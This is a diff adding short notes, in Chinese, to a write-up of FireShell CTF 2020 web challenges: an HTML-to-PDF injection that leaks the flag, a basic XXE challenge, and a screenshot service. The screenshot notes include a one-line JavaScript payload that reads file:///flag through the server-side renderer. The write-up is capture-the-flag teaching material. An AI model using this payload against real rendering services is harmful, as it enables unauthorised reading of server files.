@@ -36,4 +36,21 @@ https://blog.shoebpatel.com/2020/03/23/FireShell-CTF-2020-Write-up/
 </body>
 ```
 
+貌似是因为后端在转pdf的时候会执行html里的指令，然后把flag带出来了
+
 然后用kali的pdfdetach分离出pdf里的attachment
+
+## Car
+
+一个基础XXE
+
+## ScreenShooter
+
+和URL TO PDF类似的思路
+
+这里利用javascript去读
+
+```javascript
+exp=new XMLHttpRequest;exp.onload=function(){document.write(this.responseText)};exp.open("GET","file:///flag");exp.send();
+```
+
